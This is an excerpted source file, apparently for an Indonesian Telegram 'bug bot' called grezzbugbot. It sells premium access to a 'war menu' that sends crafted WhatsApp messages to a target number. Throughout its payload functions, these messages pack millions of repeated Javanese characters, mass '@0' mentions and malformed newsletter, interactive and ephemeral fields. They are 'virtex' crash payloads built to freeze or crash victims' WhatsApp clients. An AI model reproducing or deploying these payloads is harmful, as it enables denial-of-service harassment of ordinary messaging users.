  ...
  return (ctx, next) => {
    if (ctx.chat.type === "group" || ctx.chat.type === "supergroup") {
      if (allowedGroupIds.includes(ctx.chat.id)) {
        ...
        return ctx.reply("🚫 grup ini belum mendapatkan akses dari owner");
      }
    } else {
      return ctx.reply("❌ khusus grup!");
    }
  };
};
...
bot.command('getfile', async (ctx) => {
  ...
  try {
    ...
    ctx.reply("User Belom Sambungin Device.");
  }
});
...
const photoUrls = [
  'https://f.top4top.io/p_33072jieu0.jpg',
  'https://f.top4top.io/p_33072jieu0.jpg',  
  'https://f.top4top.io/p_33072jieu0.jpg',  
  'https://f.top4top.io/p_33072jieu0.jpg'  
];
...
const buttons = Markup.inlineKeyboard([
  ...
  [
    Markup.button.callback(' warmenu', 'option1'),
  ...
  [Markup.button.url(' hubungi admin', 'https://t.me/niasyourfav')],
]);
  await ctx.replyWithPhoto(getRandomPhoto(), {
    caption: `
${greeting}☁️
Aloo ${ctx.from.first_name || 'User'} Aku Adalah grezzbugbot yang Siap, Membantu Dengan Masalah Apapun.. 
⎔━━━━━‐━━━━━‐━━━━━━━〆
...
const buttons = Markup.inlineKeyboard([
  // Baris pertama: BugMenu dan OwnerMenu
    [
    Markup.button.callback(' war menu', 'option1'),
    Markup.button.callback(' owner menu', 'option2'),
  ],
  // Baris kedua: RandomMenu dan About
  [
    Markup.button.callback(' randommenu', 'randommenu'),
...
bot.action('option1', async (ctx) => {
 const userId = ctx.from.id;
  ...
  const caption = `
${greeting}☁️
halo ${ctx.from.first_name || 'User'} aku grezzbugbot yang siap, membantu dengan masalah apapun..
━━━━━━━━━━━━━━━━━━━━━
╭──(     \`ʙᴜɢᴍᴇɴᴜ\`     )
│
ㅒ
...
bot.action('option2', async (ctx) => {
 const userId = ctx.from.id;
  ...
  const caption = `
${greeting}☁️
halo ${ctx.from.first_name || 'User'} aku adalah grezzbugbot yang selalu siap membantumu..
━━━━━━━━━━━━━━━━━━━━━
╭──(     \`ᴏᴡɴᴇʀᴍᴇɴᴜ\`     )
│
ㅒ
...
bot.action('randommenu', async (ctx) => {
 const userId = ctx.from.id;
  ...
  const caption = `
${greeting}☁️
Aloo ${ctx.from.first_name || 'User'} aku adalah grezzbugbot yang selalu siap membantumu..
━━━━━━━━━━━━━━━━━━━━━
╭──(     \`ꜱᴇᴀʀᴄʜᴍᴇɴᴜ\`     )
│
ㅒ
...
// Command untuk melihat daftar user premium
  bot.command('listprem', async (ctx) => {
    ...
    if (premiumUsers.length > 0) {
        ...
        const photoUrl = 'https://f.top4top.io/p_33072jieu0.jpg'; // Ganti dengan URL gambar
...
const prosesrespone = (target, ctx) => {
    const photoUrl = 'https://files.catbox.moe/ol9w8x.jpg'; // Ganti dengan URL gambar lain jika diperlukan
...
const donerespone = (target, ctx) => {
    const photoUrl = 'https://f.top4top.io/p_33072jieu0.jpg'; // Ganti dengan URL gambar lain jika diperlukan
    const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna"; // Mengambil nama peminta dari konteks
    const date = new Date().toLocaleString("id-ID", { 
        weekday: 'long', 
        year: 'numeric', 
...
let virtex =  "grezzbugbot" + "ꦽ".repeat(45000) + "@13135550002".repeat(50000);
            ...
            console.log(chalk.red.bold('grezzbugbot'))
   	};
...
serverMessageId: 1,
newsletterName: `- grezz 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
...
participant: { jid : target }
    ...
    let virtex = "grezzx" + "ꦾ".repeat(250000) + "@0".repeat(250000);
    await cay.relayMessage(target, {
            ...
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        ...
                        newsletterName: "grezzx" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
        ...
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "grezzx" + "@0".repeat(250000) + "ꦾ".repeat(100000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
        ...
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "ꦾ".repeat(2500000) + "@0".repeat(1000000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
        ...
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "ꦾ".repeat(2500000) + "@0".repeat(100000)
                    },
                    nativeFlowMessage: {
        ...
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "see you" + "ꦾ".repeat(3000000)  + "@1".repeat(3000000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
...
async function InVisiLoc(target, ptcp = false) {
    ...
    console.log(chalk.green("Send Bug By Grezzmods"));
};
        ...
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "see you" + "ꦾ".repeat(3)
                    },
                    nativeFlowMessage: {
                        "buttons": [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": "{\"display_text\":\"YouTube 🍒\",\"url\":\"https://youtube.com/@WindahBasudara\",\"merchant_url\":\"https://www.google.com\"}"
                            },
                            {
                                "name": "cta_url",
							...
							interactiveMessage: {
								header: {
									documentMessage: {
										...
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: 'https://f.top4top.io/p_33072jieu0.jpg',
									},
									hasMediaAttachment: true,
								},
								body: { 
          ...
          extendedTextMessage: {
            ...
            contextInfo: {
              ...
              externalAdReply: {
                ...
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/niasyourfav",
                mediaUrl: "https://t.me/niasyourfav",
